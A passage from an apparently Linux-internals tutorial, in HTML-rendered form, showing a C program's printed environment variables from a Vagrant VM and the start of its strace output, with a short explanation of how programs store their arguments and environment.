</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937e2</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LS_COLORS</span><span class="o">=</span><span class="n">rs</span><span class="o">=</span><span class="mi">0</span><span class="p">:</span><span class="n">di</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">34</span><span class="p">:</span><span class="n">ln</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="n">mh</span><span class="o">=</span><span class="mi">00</span><span class="p">:</span><span class="n">pi</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">:</span><span class="n">so</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="k">do</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="n">bd</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="n">cd</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="ow">or</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">31</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="n">mi</span><span class="o">=</span><span class="mi">00</span><span class="p">:</span><span class="n">su</span><span class="o">=</span><span class="mi">37</span><span class="p">;</span><span class="mi">41</span><span class="p">:</span><span class="n">sg</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">43</span><span class="p">:</span><span class="n">ca</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">41</span><span class="p">:</span><span class="n">tw</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">42</span><span class="p">:</span><span class="n">ow</span><span class="o">=</span><span class="mi">34</span><span class="p">;</span><span class="mi">42</span><span class="p">:</span><span class="n">st</span><span class="o">=</span><span class="mi">37</span><span class="p">;</span><span class="mi">44</span><span class="p">:</span><span class="n">ex</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">32</span><span class="p">:</span><span class="o">*.</span><span class="n">tar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tgz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">arc</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">arj</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">taz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lha</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lz4</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzh</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzma</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tlz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">txz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tzo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">t7z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zip</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">dz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">gz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lrz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">xz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zst</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tzst</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">bz2</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">bz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tbz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tbz2</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">deb</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rpm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">jar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">war</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">ear</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">sar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">alz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">ace</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zoo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">cpio</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="mi">7</span><span class="n">z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">cab</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">wim</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">swm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">dwm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">esd</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">jpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">jpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mjpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mjpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">gif</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">bmp</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pbm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pgm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ppm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tga</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xbm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xpm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tif</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tiff</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">png</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">svg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">svgz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mng</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pcx</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mov</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">m2v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mkv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">webm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mp4</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">m4v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mp4v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">vob</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">qt</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">nuv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">wmv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">asf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">rm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">rmvb</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">flc</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">avi</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">fli</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">flv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">gl</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">dl</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xcf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xwd</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">yuv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">cgm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">emf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogx</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">aac</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">au</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">flac</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">m4a</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mid</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">midi</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mka</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mp3</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mpc</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">ogg</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">ra</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">wav</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">oga</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">opus</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">spx</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">xspf</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93dc4</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_CONNECTION</span><span class="o">=</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.2</span> <span class="mi">34954</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">2.15</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93def</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LESSCLOSE</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">lesspipe</span> <span class="o">%</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e11</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_CLASS</span><span class="o">=</span><span class="n">user</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e28</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">TERM</span><span class="o">=</span><span class="n">tmux</span><span class="o">-</span><span class="mi">256</span><span class="n">color</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e3b</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LESSOPEN</span><span class="o">=|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">lesspipe</span> <span class="o">%</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e5b</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">USER</span><span class="o">=</span><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e68</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SHLVL</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e70</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_ID</span><span class="o">=</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e81</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_RUNTIME_DIR</span><span class="o">=/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93ea0</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_CLIENT</span><span class="o">=</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.2</span> <span class="mi">34954</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93ebd</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_DATA_DIRS</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">desktop</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93efe</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93f66</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">DBUS_SESSION_BUS_ADDRESS</span><span class="o">=</span><span class="n">unix</span><span class="p">:</span><span class="n">path</span><span class="o">=/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span><span class="o">/</span><span class="n">bus</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93f9c</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_TTY</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93faf</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">_</span><span class="o">=./</span><span class="n">not_hello_world</span><span class="o">.</span><span class="n">o</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93fc5</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">OLDPWD</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">workspace</span>
</span></span></code></pre></div><p>This still does not gives us what is happening behind the scenes, but it tells us that each program has some dedicated memory space where it stores a copy of arguments and environment variables in <strong>continuous memory locations</strong>. To gather more information we can use the <a href="https://www.man7.org/linux/man-pages/man1/strace.1.html"><code>strace</code></a> utility to trace the system calls made by our program.</p>
<p><strong>Command</strong>: <code>strace ./not_hello_world.o  myarg1 myarg2 myarg3  2&gt;strace_output.log  1&gt;program_output.log</code><br>
<em>NOTE:-  2(stderr) redirected to strace_output.log file and 1(stdout) redirected to program_output.log file</em></p>
<p>command : <code>cat strace_output.log</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">execve<span class="o">(</span><span class="s2">&#34;./not_hello_world.o&#34;</span>, <span class="o">[</span><span class="s2">&#34;./not_hello_world.o&#34;</span>, <span class="s2">&#34;myarg1&#34;</span>, <span class="s2">&#34;myarg2&#34;</span>, <span class="s2">&#34;myarg3&#34;</span><span class="o">]</span>, 0x7ffe0dbf2cf8 /* <span class="m">25</span> vars */<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x5593be003000
</span></span><span class="line"><span class="cl">arch_prctl<span class="o">(</span>0x3001 /* ARCH_??? */, 0x7ffea24b4bc0<span class="o">)</span> <span class="o">=</span> -1 EINVAL <span class="o">(</span>Invalid argument<span class="o">)</span>
</span></span><span class="line"><span class="cl">access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.preload&#34;</span>, R_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
</span></span><span class="line"><span class="cl">fstat<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>28934, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>NULL, 28934, PROT_READ, MAP_PRIVATE, 3, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a640000
</span></span><span class="line"><span class="cl">close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
</span></span><span class="line"><span class="cl">read<span class="o">(</span>3, <span class="s2">&#34;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\360q\2\0\0\0\0\0&#34;</span>..., 832<span class="o">)</span> <span class="o">=</span> <span class="m">832</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;</span>..., 784, 64<span class="o">)</span> <span class="o">=</span> <span class="m">784</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&#34;</span>, 32, 848<span class="o">)</span> <span class="o">=</span> <span class="m">32</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X&gt;\263&#34;</span>..., 68, 880<span class="o">)</span> <span class="o">=</span> <span class="m">68</span>
</span></span><span class="line"><span class="cl">fstat<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0755, <span class="nv">st_size</span><span class="o">=</span>2029224, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>NULL, 8192, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a63e000
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;</span>..., 784, 64<span class="o">)</span> <span class="o">=</span> <span class="m">784</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&#34;</span>, 32, 848<span class="o">)</span> <span class="o">=</span> <span class="m">32</span>
